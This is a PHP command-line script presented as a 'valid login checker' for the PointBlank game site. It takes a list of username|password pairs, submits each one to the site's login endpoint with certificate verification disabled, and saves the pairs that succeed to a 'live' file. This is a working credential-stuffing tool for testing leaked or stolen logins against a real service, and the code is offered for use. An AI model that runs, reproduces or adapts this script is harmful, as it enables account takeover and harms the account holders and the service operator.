<?php

ini_set('date.timezone', 'Asia/Jakarta');
ob_implicit_flush(true);
error_reporting(0);
function in_string($s,$as) {
	$s=strtoupper($s);
	if(!is_array($as)) $as=array($as);
	for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
	return false;
}
echo "============================================\n";
echo "    \033[91mPointBlank Zepetto Valid Login Checker\033[0m "; 
echo "\n============================================\n";
echo "Created by : \033[92mAzull\n";
echo "============================================\n";

$delim = "|";

echo "List \t\t: ";
$list = trim(fgets(STDIN));

echo "Sleep \t\t: ";
$tidur = trim(fgets(STDIN));

echo "============================================\n";
$file = file_get_contents("$list");
$data = explode("\r\n",$file);
$jumlah= 0; $live=0; $mati=0;
for($a=0;$a<count($data);$a++){
	$date = date("h:i:sa");
        $data1 = explode($delim,$data[$a]);
        $userid = $data1[0];
        $pass = $data1[1];
	
	
	$dir                   = dirname(__FILE__);
$config = $dir . '/_cook/' .rand(1,999999999999999). '.txt';
if (!file_exists($config)) {
    $fp = @fopen($config, 'w');
    @fclose($fp);
}
	$ch = curl_init('https://www.pointblank.id/login/process');
	
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch,CURLOPT_POST,1);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,TRUE);
        curl_setopt($ch,CURLOPT_POST,TRUE);
        curl_setopt($ch,CURLOPT_FOLLOWLOCATION,TRUE);
        curl_setopt($ch,CURLOPT_COOKIEFILE, "$config");
        curl_setopt($ch,CURLOPT_COOKIEJAR,  "$config");
curl_setopt($ch,CURLOPT_POSTFIELDS,"userid=$userid&password=$pass");
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
$result = curl_exec($ch);
curl_close($ch);

	$points = $cek['data']['points'];
	$gabung = "$userid|$pass|Live";
	if (strpos($result, "Data login yang anda masukan tidak sesuai") == FALSE) {
 if(!in_array($cek,explode("\n",@file_get_contents("pointblank-live.txt")))){
  $h=fopen("pointblank-live.txt","a");
 fwrite($h,$gabung."\r\n");
  fclose($h);
	  
  }
	echo "\033[95m [" . $date . "]\033[0m".$userid; $cek = "\033[92m [Live] \033[0m"; $live+=1;
  }else{
		echo "\033[95m [" . $date . "]\033[0m".$userid; $cek = "\033[91m [Diee] \033[0m"; $mati+=1;
	}
	ob_flush();
	sleep($tidur);
   print($cek."\n");
}
	echo "============================================\n";
	print ("Account \033[1;34mChecked : " . count($data). "\033[0m\n");
	echo "Account \033[92mLive: $live \033[0mand account \033[91mDie: $mati\033[0m \n";

?>
